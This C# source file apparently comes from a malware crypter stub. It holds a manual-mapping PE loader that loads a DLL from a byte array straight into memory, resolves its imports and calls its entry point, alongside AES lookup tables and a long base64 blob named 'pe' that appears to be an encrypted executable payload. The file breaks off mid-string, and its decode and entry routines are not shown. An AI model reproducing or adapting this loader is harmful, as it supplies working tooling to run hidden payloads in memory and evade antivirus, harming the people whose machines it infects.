using System;
using System.Runtime.InteropServices;

internal class Stub
{
	internal struct IMAGE_EXPORT_DIRECTORY
	{
		public uint Characteristics;

		public uint TimeDateStamp;

		public ushort MajorVersion;

		public ushort MinorVersion;

		public uint Name;

		public uint Base;

		public uint NumberOfFunctions;

		public uint NumberOfNames;

		public uint AddressOfFunctions;

		public uint AddressOfNames;

		public uint AddressOfNameOrdinals;
	}

	internal struct IMAGE_IMPORT_BY_NAME
	{
		public short Hint;

		public byte Name;
	}

	internal struct MEMORYMODULE
	{
		public IMAGE_NT_HEADERS headers;

		public IntPtr codeBase;

		public IntPtr modules;

		public int numModules;

		public int initialized;
	}

	internal struct IMAGE_BASE_RELOCATION
	{
		public uint VirtualAddress;

		public uint SizeOfBlock;
	}

	internal struct IMAGE_IMPORT_DESCRIPTOR
	{
		public uint CharacteristicsOrOriginalFirstThunk;

		public uint TimeDateStamp;

		public uint ForwarderChain;

		public uint Name;

		public uint FirstThunk;
	}

	[StructLayout(LayoutKind.Sequential, Pack = 4)]
	internal struct IMAGE_SECTION_HEADER
	{
		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
		public byte[] Name;

		public uint PhysicalAddress;

		public uint VirtualAddress;

		public uint SizeOfRawData;

		public uint PointerToRawData;

		public uint PointerToRelocations;

		public uint PointerToLinenumbers;

		public short NumberOfRelocations;

		public short NumberOfLinenumbers;

		public uint Characteristics;
	}

	[StructLayout(LayoutKind.Sequential, Pack = 4)]
	internal struct IMAGE_DOS_HEADER
	{
		public ushort e_magic;

		public ushort e_cblp;

		public ushort e_cp;

		public ushort e_crlc;

		public ushort e_cparhdr;

		public ushort e_minalloc;

		public ushort e_maxalloc;

		public ushort e_ss;

		public ushort e_sp;

		public ushort e_csum;

		public ushort e_ip;

		public ushort e_cs;

		public ushort e_lfarlc;

		public ushort e_ovno;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
		public ushort[] e_res1;

		public ushort e_oemid;

		public ushort e_oeminfo;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
		public ushort[] e_res2;

		public int e_lfanew;
	}

	[StructLayout(LayoutKind.Sequential, Pack = 4)]
	internal struct IMAGE_DATA_DIRECTORY
	{
		public uint VirtualAddress;

		public uint Size;
	}

	[StructLayout(LayoutKind.Sequential, Pack = 4)]
	internal struct IMAGE_OPTIONAL_HEADER32
	{
		public ushort Magic;

		public byte MajorLinkerVersion;

		public byte MinorLinkerVersion;

		public uint SizeOfCode;

		public uint SizeOfInitializedData;

		public uint SizeOfUninitializedData;

		public uint AddressOfEntryPoint;

		public uint BaseOfCode;

		public uint BaseOfData;

		public uint ImageBase;

		public uint SectionAlignment;

		public uint FileAlignment;

		public ushort MajorOperatingSystemVersion;

		public ushort MinorOperatingSystemVersion;

		public ushort MajorImageVersion;

		public ushort MinorImageVersion;

		public ushort MajorSubsystemVersion;

		public ushort MinorSubsystemVersion;

		public uint Win32VersionValue;

		public uint SizeOfImage;

		public uint SizeOfHeaders;

		public uint CheckSum;

		public ushort Subsystem;

		public ushort DllCharacteristics;

		public uint SizeOfStackReserve;

		public uint SizeOfStackCommit;

		public uint SizeOfHeapReserve;

		public uint SizeOfHeapCommit;

		public uint LoaderFlags;

		public uint NumberOfRvaAndSizes;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
		public IMAGE_DATA_DIRECTORY[] DataDirectory;
	}

	[StructLayout(LayoutKind.Sequential, Pack = 4)]
	internal struct IMAGE_FILE_HEADER
	{
		public ushort Machine;

		public ushort NumberOfSections;

		public uint TimeDateStamp;

		public uint PointerToSymbolTable;

		public uint NumberOfSymbols;

		public ushort SizeOfOptionalHeader;

		public ushort Characteristics;
	}

	internal struct IMAGE_NT_HEADERS
	{
		public uint Signature;

		public IMAGE_FILE_HEADER FileHeader;

		public IMAGE_OPTIONAL_HEADER32 OptionalHeader;
	}

	internal class ManualMap
	{
		internal class Win32Constants
		{
			public static uint MEM_COMMIT = 4096u;

			public static uint PAGE_EXECUTE_READWRITE = 64u;

			public static uint PAGE_READWRITE = 4u;

			public static uint MEM_RELEASE = 32768u;

			public static uint MEM_RESERVE = 8192u;
		}

		internal static class Win32Imports
		{
			[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
			public static extern uint GetProcAddress(IntPtr hModule, string procName);

			[DllImport("kernel32")]
			public static extern int LoadLibrary(string lpFileName);

			[DllImport("kernel32")]
			public static extern uint GetLastError();

			[DllImport("kernel32.dll")]
			public static extern IntPtr GetProcAddress(IntPtr module, IntPtr ordinal);

			[DllImport("kernel32")]
			public static extern uint VirtualAlloc(uint lpStartAddr, uint size, uint flAllocationType, uint flProtect);

			[DllImport("kernel32.dll", SetLastError = true)]
			internal static extern bool VirtualFree(IntPtr lpAddress, UIntPtr dwSize, uint dwFreeType);

			[DllImport("kernel32.dll", SetLastError = true)]
			internal static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
		}

		internal static class PointerHelpers
		{
			public unsafe static T ToStruct<T>(byte[] data) where T : struct
			{
				fixed (byte* value = &data[0])
				{
					return (T)Marshal.PtrToStructure(new IntPtr(value), typeof(T));
				}
			}

			public unsafe static T ToStruct<T>(byte[] data, uint from) where T : struct
			{
				fixed (byte* value = &data[from])
				{
					return (T)Marshal.PtrToStructure(new IntPtr(value), typeof(T));
				}
			}

			public static T ToStruct<T>(IntPtr ptr, uint from) where T : struct
			{
				return (T)Marshal.PtrToStructure(new IntPtr(ptr.ToInt32() + (int)from), typeof(T));
			}
		}

		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private unsafe delegate bool fnDllEntry(int instance, uint reason, void* reserved);

		private static readonly int[][][] ProtectionFlags = new int[2][][];

		private MEMORYMODULE module;

		internal unsafe bool LoadLibrary(byte[] data)
		{
			IMAGE_DOS_HEADER dosHeader = PointerHelpers.ToStruct<IMAGE_DOS_HEADER>(data);
			IMAGE_NT_HEADERS oldHeaders = PointerHelpers.ToStruct<IMAGE_NT_HEADERS>(data, (uint)dosHeader.e_lfanew);
			IntPtr intPtr = (IntPtr)Win32Imports.VirtualAlloc(oldHeaders.OptionalHeader.ImageBase, oldHeaders.OptionalHeader.SizeOfImage, Win32Constants.MEM_RESERVE, Win32Constants.PAGE_READWRITE);
			if (intPtr.ToInt32() == 0)
			{
				intPtr = (IntPtr)Win32Imports.VirtualAlloc((uint)(int)intPtr, oldHeaders.OptionalHeader.SizeOfImage, Win32Constants.MEM_RESERVE, Win32Constants.PAGE_READWRITE);
			}
			module = new MEMORYMODULE
			{
				codeBase = intPtr,
				numModules = 0,
				modules = new IntPtr(0),
				initialized = 0
			};
			Win32Imports.VirtualAlloc((uint)(int)intPtr, oldHeaders.OptionalHeader.SizeOfImage, Win32Constants.MEM_COMMIT, Win32Constants.PAGE_READWRITE);
			IntPtr intPtr2 = (IntPtr)Win32Imports.VirtualAlloc((uint)(int)intPtr, oldHeaders.OptionalHeader.SizeOfHeaders, Win32Constants.MEM_COMMIT, Win32Constants.PAGE_READWRITE);
			Marshal.Copy(data, 0, intPtr2, (int)(dosHeader.e_lfanew + oldHeaders.OptionalHeader.SizeOfHeaders));
			module.headers = PointerHelpers.ToStruct<IMAGE_NT_HEADERS>(intPtr2, (uint)dosHeader.e_lfanew);
			module.headers.OptionalHeader.ImageBase = (uint)(int)intPtr;
			CopySections(data, oldHeaders, intPtr2, dosHeader);
			uint num = (uint)(int)new IntPtr(intPtr.ToInt32() - (int)oldHeaders.OptionalHeader.ImageBase);
			if (num != 0)
			{
				PerformBaseRelocation(num);
			}
			BuildImportTable();
			FinalizeSections(intPtr2, dosHeader, oldHeaders);
			bool flag = false;
			try
			{
				fnDllEntry fnDllEntry = (fnDllEntry)Marshal.GetDelegateForFunctionPointer(new IntPtr(module.codeBase.ToInt32() + (int)module.headers.OptionalHeader.AddressOfEntryPoint), typeof(fnDllEntry));
				return fnDllEntry(intPtr.ToInt32(), 1u, null);
			}
			catch
			{
				return false;
			}
		}

		public int GetModuleCount()
		{
			int num = 0;
			IntPtr codeBase = module.codeBase;
			IMAGE_DATA_DIRECTORY iMAGE_DATA_DIRECTORY = module.headers.OptionalHeader.DataDirectory[1];
			if (iMAGE_DATA_DIRECTORY.Size != 0)
			{
				IMAGE_IMPORT_DESCRIPTOR iMAGE_IMPORT_DESCRIPTOR = PointerHelpers.ToStruct<IMAGE_IMPORT_DESCRIPTOR>(codeBase, iMAGE_DATA_DIRECTORY.VirtualAddress);
				while (iMAGE_IMPORT_DESCRIPTOR.Name != 0)
				{
					IntPtr ptr = new IntPtr(codeBase.ToInt32() + (int)iMAGE_IMPORT_DESCRIPTOR.Name);
					string lpFileName = Marshal.PtrToStringAnsi(ptr);
					int num2 = Win32Imports.LoadLibrary(lpFileName);
					if (num2 == -1)
					{
						break;
					}
					num++;
					iMAGE_IMPORT_DESCRIPTOR = PointerHelpers.ToStruct<IMAGE_IMPORT_DESCRIPTOR>(codeBase, (uint)(iMAGE_DATA_DIRECTORY.VirtualAddress + Marshal.SizeOf(typeof(IMAGE_IMPORT_DESCRIPTOR)) * num));
				}
			}
			return num;
		}

		public unsafe int BuildImportTable()
		{
			int moduleCount = GetModuleCount();
			module.modules = Marshal.AllocHGlobal(moduleCount * 4);
			int num = 0;
			int result = 1;
			IntPtr codeBase = module.codeBase;
			IMAGE_DATA_DIRECTORY iMAGE_DATA_DIRECTORY = module.headers.OptionalHeader.DataDirectory[1];
			if (iMAGE_DATA_DIRECTORY.Size != 0)
			{
				IMAGE_IMPORT_DESCRIPTOR iMAGE_IMPORT_DESCRIPTOR = PointerHelpers.ToStruct<IMAGE_IMPORT_DESCRIPTOR>(codeBase, iMAGE_DATA_DIRECTORY.VirtualAddress);
				while (iMAGE_IMPORT_DESCRIPTOR.Name != 0)
				{
					IntPtr ptr = new IntPtr(codeBase.ToInt32() + (int)iMAGE_IMPORT_DESCRIPTOR.Name);
					string lpFileName = Marshal.PtrToStringAnsi(ptr);
					int num2 = Win32Imports.LoadLibrary(lpFileName);
					if (num2 != -1)
					{
						uint* ptr2;
						uint* ptr3;
						if (iMAGE_IMPORT_DESCRIPTOR.CharacteristicsOrOriginalFirstThunk != 0)
						{
							IntPtr intPtr = new IntPtr(codeBase.ToInt32() + (int)iMAGE_IMPORT_DESCRIPTOR.CharacteristicsOrOriginalFirstThunk);
							ptr2 = (uint*)(void*)intPtr;
							ptr3 = (uint*)(void*)new IntPtr(codeBase.ToInt32() + (int)iMAGE_IMPORT_DESCRIPTOR.FirstThunk);
						}
						else
						{
							ptr2 = (uint*)(void*)new IntPtr(codeBase.ToInt32() + (int)iMAGE_IMPORT_DESCRIPTOR.FirstThunk);
							ptr3 = (uint*)(void*)new IntPtr(codeBase.ToInt32() + (int)iMAGE_IMPORT_DESCRIPTOR.FirstThunk);
						}
						while (*ptr2 != 0)
						{
							if ((*ptr2 & 0x80000000u) != 0)
							{
								*ptr3 = (uint)(int)Win32Imports.GetProcAddress(new IntPtr(num2), new IntPtr(*ptr2 & 0xFFFF));
							}
							else
							{
								IntPtr ptr4 = new IntPtr(codeBase.ToInt32() + (int)(*ptr2) + 2);
								string procName = Marshal.PtrToStringAnsi(ptr4);
								*ptr3 = Win32Imports.GetProcAddress(new IntPtr(num2), procName);
							}
							if (*ptr3 != 0)
							{
								ptr2++;
								ptr3++;
								continue;
							}
							result = 0;
							break;
						}
						num++;
						iMAGE_IMPORT_DESCRIPTOR = PointerHelpers.ToStruct<IMAGE_IMPORT_DESCRIPTOR>(codeBase, iMAGE_DATA_DIRECTORY.VirtualAddress + (uint)(Marshal.SizeOf(typeof(IMAGE_IMPORT_DESCRIPTOR)) * num));
						continue;
					}
					result = 0;
					break;
				}
			}
			return result;
		}

		public void FinalizeSections(IntPtr headers, IMAGE_DOS_HEADER dosHeader, IMAGE_NT_HEADERS oldHeaders)
		{
			ProtectionFlags[0] = new int[2][];
			ProtectionFlags[1] = new int[2][];
			ProtectionFlags[0][0] = new int[2];
			ProtectionFlags[0][1] = new int[2];
			ProtectionFlags[1][0] = new int[2];
			ProtectionFlags[1][1] = new int[2];
			ProtectionFlags[0][0][0] = 1;
			ProtectionFlags[0][0][1] = 8;
			ProtectionFlags[0][1][0] = 2;
			ProtectionFlags[0][1][1] = 4;
			ProtectionFlags[1][0][0] = 16;
			ProtectionFlags[1][0][1] = 128;
			ProtectionFlags[1][1][0] = 32;
			ProtectionFlags[1][1][1] = 64;
			IMAGE_SECTION_HEADER iMAGE_SECTION_HEADER = PointerHelpers.ToStruct<IMAGE_SECTION_HEADER>(headers, (uint)(24 + dosHeader.e_lfanew + oldHeaders.FileHeader.SizeOfOptionalHeader));
			for (int i = 0; i < module.headers.FileHeader.NumberOfSections; i++)
			{
				int num = (((iMAGE_SECTION_HEADER.Characteristics & 0x20000000u) != 0) ? 1 : 0);
				int num2 = (((iMAGE_SECTION_HEADER.Characteristics & 0x40000000u) != 0) ? 1 : 0);
				int num3 = (((iMAGE_SECTION_HEADER.Characteristics & 0x80000000u) != 0) ? 1 : 0);
				if ((iMAGE_SECTION_HEADER.Characteristics & 0x2000000u) != 0)
				{
					Win32Imports.VirtualFree(new IntPtr(iMAGE_SECTION_HEADER.PhysicalAddress), (UIntPtr)iMAGE_SECTION_HEADER.SizeOfRawData, 16384u);
					continue;
				}
				uint num4 = (uint)ProtectionFlags[num][num2][num3];
				if ((iMAGE_SECTION_HEADER.Characteristics & 0x4000000u) != 0)
				{
					num4 |= 0x200u;
				}
				int num5 = (int)iMAGE_SECTION_HEADER.SizeOfRawData;
				if (num5 == 0)
				{
					if ((iMAGE_SECTION_HEADER.Characteristics & 0x40u) != 0)
					{
						num5 = (int)module.headers.OptionalHeader.SizeOfInitializedData;
					}
					else if ((iMAGE_SECTION_HEADER.Characteristics & 0x80u) != 0)
					{
						num5 = (int)module.headers.OptionalHeader.SizeOfUninitializedData;
					}
				}
				if (num5 > 0)
				{
					Win32Imports.VirtualProtect(new IntPtr(iMAGE_SECTION_HEADER.PhysicalAddress), iMAGE_SECTION_HEADER.SizeOfRawData, num4, out var _);
				}
				iMAGE_SECTION_HEADER = PointerHelpers.ToStruct<IMAGE_SECTION_HEADER>(headers, (uint)(24 + dosHeader.e_lfanew + oldHeaders.FileHeader.SizeOfOptionalHeader + Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER)) * (i + 1)));
			}
		}

		public unsafe void PerformBaseRelocation(uint delta)
		{
			IntPtr codeBase = module.codeBase;
			int num = Marshal.SizeOf(typeof(IMAGE_BASE_RELOCATION));
			IMAGE_DATA_DIRECTORY iMAGE_DATA_DIRECTORY = module.headers.OptionalHeader.DataDirectory[5];
			int num2 = 0;
			if (iMAGE_DATA_DIRECTORY.Size == 0)
			{
				return;
			}
			IMAGE_BASE_RELOCATION iMAGE_BASE_RELOCATION = PointerHelpers.ToStruct<IMAGE_BASE_RELOCATION>(codeBase, iMAGE_DATA_DIRECTORY.VirtualAddress);
			while (iMAGE_BASE_RELOCATION.VirtualAddress != 0)
			{
				IntPtr intPtr = (IntPtr)(codeBase.ToInt32() + (int)iMAGE_BASE_RELOCATION.VirtualAddress);
				ushort* ptr = (ushort*)(codeBase.ToInt32() + (int)iMAGE_DATA_DIRECTORY.VirtualAddress + num);
				uint num3 = 0u;
				while (num3 < (iMAGE_BASE_RELOCATION.SizeOfBlock - Marshal.SizeOf(typeof(IMAGE_BASE_RELOCATION))) / 2L)
				{
					int num4 = *ptr >> 12;
					int num5 = *ptr & 0xFFF;
					int num6 = num4;
					if (num6 != 0 && num6 == 3)
					{
						uint* ptr2 = (uint*)(void*)new IntPtr(intPtr.ToInt32() + num5);
						*ptr2 += delta;
					}
					num3++;
					ptr++;
				}
				num2 += (int)iMAGE_BASE_RELOCATION.SizeOfBlock;
				iMAGE_BASE_RELOCATION = PointerHelpers.ToStruct<IMAGE_BASE_RELOCATION>(codeBase, (uint)(iMAGE_DATA_DIRECTORY.VirtualAddress + num2));
			}
		}

		public unsafe uint GetProcAddress(string name)
		{
			IntPtr codeBase = module.codeBase;
			int num = -1;
			IMAGE_DATA_DIRECTORY iMAGE_DATA_DIRECTORY = module.headers.OptionalHeader.DataDirectory[0];
			if (iMAGE_DATA_DIRECTORY.Size == 0)
			{
				return 0u;
			}
			IMAGE_EXPORT_DIRECTORY iMAGE_EXPORT_DIRECTORY = PointerHelpers.ToStruct<IMAGE_EXPORT_DIRECTORY>(codeBase, iMAGE_DATA_DIRECTORY.VirtualAddress);
			uint* ptr = (uint*)(void*)new IntPtr(codeBase.ToInt32() + iMAGE_EXPORT_DIRECTORY.AddressOfNames);
			ushort* ptr2 = (ushort*)(void*)new IntPtr(codeBase.ToInt32() + iMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals);
			uint num2 = 0u;
			while (num2 < iMAGE_EXPORT_DIRECTORY.NumberOfNames)
			{
				IntPtr ptr3 = new IntPtr(codeBase.ToInt32() + (int)(*ptr));
				string text = Marshal.PtrToStringAnsi(ptr3);
				if (!(text == name))
				{
					num2++;
					ptr++;
					ptr2++;
					continue;
				}
				num = *ptr2;
				break;
			}
			uint* ptr4 = (uint*)(codeBase.ToInt32() + (iMAGE_EXPORT_DIRECTORY.AddressOfFunctions + num * 4));
			return (uint)(codeBase.ToInt32() + *ptr4);
		}

		public void CopySections(byte[] data, IMAGE_NT_HEADERS oldHeaders, IntPtr headers, IMAGE_DOS_HEADER dosHeader)
		{
			IntPtr codeBase = module.codeBase;
			IMAGE_SECTION_HEADER iMAGE_SECTION_HEADER = PointerHelpers.ToStruct<IMAGE_SECTION_HEADER>(headers, (uint)(24 + dosHeader.e_lfanew + oldHeaders.FileHeader.SizeOfOptionalHeader));
			for (int i = 0; i < module.headers.FileHeader.NumberOfSections; i++)
			{
				if (iMAGE_SECTION_HEADER.SizeOfRawData == 0)
				{
					uint sectionAlignment = oldHeaders.OptionalHeader.SectionAlignment;
					if (sectionAlignment != 0)
					{
						IntPtr intPtr = new IntPtr(Win32Imports.VirtualAlloc((uint)(int)new IntPtr(codeBase.ToInt32() + (int)iMAGE_SECTION_HEADER.VirtualAddress), sectionAlignment, Win32Constants.MEM_COMMIT, Win32Constants.PAGE_READWRITE));
						iMAGE_SECTION_HEADER.PhysicalAddress = (uint)(int)intPtr;
						IntPtr ptr = new IntPtr(headers.ToInt32() + (32 + dosHeader.e_lfanew + oldHeaders.FileHeader.SizeOfOptionalHeader) + Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER)) * i);
						Marshal.WriteInt32(ptr, (int)intPtr);
						byte[] source = new byte[sectionAlignment + 1];
						Marshal.Copy(source, 0, intPtr, (int)sectionAlignment);
					}
					iMAGE_SECTION_HEADER = PointerHelpers.ToStruct<IMAGE_SECTION_HEADER>(headers, (uint)(24 + dosHeader.e_lfanew + oldHeaders.FileHeader.SizeOfOptionalHeader + Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER)) * (i + 1)));
				}
				else
				{
					IntPtr intPtr = new IntPtr(Win32Imports.VirtualAlloc((uint)(int)new IntPtr(codeBase.ToInt32() + (int)iMAGE_SECTION_HEADER.VirtualAddress), iMAGE_SECTION_HEADER.SizeOfRawData, Win32Constants.MEM_COMMIT, Win32Constants.PAGE_READWRITE));
					Marshal.Copy(data, (int)iMAGE_SECTION_HEADER.PointerToRawData, intPtr, (int)iMAGE_SECTION_HEADER.SizeOfRawData);
					iMAGE_SECTION_HEADER.PhysicalAddress = (uint)(int)intPtr;
					IntPtr ptr2 = new IntPtr(headers.ToInt32() + (32 + dosHeader.e_lfanew + oldHeaders.FileHeader.SizeOfOptionalHeader) + Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER)) * i);
					Marshal.WriteInt32(ptr2, (int)intPtr);
					iMAGE_SECTION_HEADER = PointerHelpers.ToStruct<IMAGE_SECTION_HEADER>(headers, (uint)(24 + dosHeader.e_lfanew + oldHeaders.FileHeader.SizeOfOptionalHeader + Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER)) * (i + 1)));
				}
			}
		}
	}

	private static int Nb;

	private static int Nk;

	private static int Nr;

	private static byte[][] w;

	public static byte[] sbox = decode("Y3x3e/Jrb8UwAWcr/terdsqCyX36WUfwrdSir5ykcsC3/ZMmNj/3zDSl5fFx2DEVBMcjwxiWBZoHEoDi6yeydQmDLBobblqgUjvWsynjL4RT0QDtIPyxW2rLvjlKTFjP0O+q+0NNM4VF+QJ/UDyfqFGjQI+SnTj1vLbaIRD/89LNDBPsX5dEF8Snfj1kXRlzYIFP3CIqkIhG7rgU3l4L2+AyOgpJBiRcwtOsYpGV5HnnyDdtjdVOqWxW9Opleq4IunglLhymtMbo3XQfS72LinA+tWZIA/YOYTVXuYbBHZ7h+JgRadmOlJseh+nOVSjfjKGJDb/mQmhBmS0PsFS7Fg==");

	public static byte[] inv_sbox = decode("Uglq1TA2pTi/QKOegfPX+3zjOYKbL/+HNI5DRMTe6ctUe5QypsIjPe5MlQtC+sNOCC6hZijZJLJ2W6JJbYvRJXL49mSGaJgW1KRczF1ltpJscEhQ/e252l4VRlenjZ2EkNirAIy80wr35FgFuLNFBtAsHo/KPw8Cwa+9AwETims6kRFBT2fc6pfyz87wtOZzlqx0IuetNYXi+TfoHHXfbkfxGnEdKcWJb7diDqoYvhv8Vj5LxtJ5IJrbwP54zVr0H92oM4gHxzGxEhBZJ4DsX2BRf6kZtUoNLeV6n5PJnO+g4DtNrir1sMjruzyDU5lhFysEfrp31ibhaRRjVSEMfQ==");

	public static byte[] Rcon = decode("jQECBAgQIECAGzZs2KtNmi9evGPGlzVq1LN9+u/FkTly5NO9YcKfJUqUM2bMgx06dOjLjQECBAgQIECAGzZs2KtNmi9evGPGlzVq1LN9+u/FkTly5NO9YcKfJUqUM2bMgx06dOjLjQECBAgQIECAGzZs2KtNmi9evGPGlzVq1LN9+u/FkTly5NO9YcKfJUqUM2bMgx06dOjLjQECBAgQIECAGzZs2KtNmi9evGPGlzVq1LN9+u/FkTly5NO9YcKfJUqUM2bMgx06dOjLjQECBAgQIECAGzZs2KtNmi9evGPGlzVq1LN9+u/FkTly5NO9YcKfJUqUM2bMgx06dOjL");

	public static byte[] pe = decode("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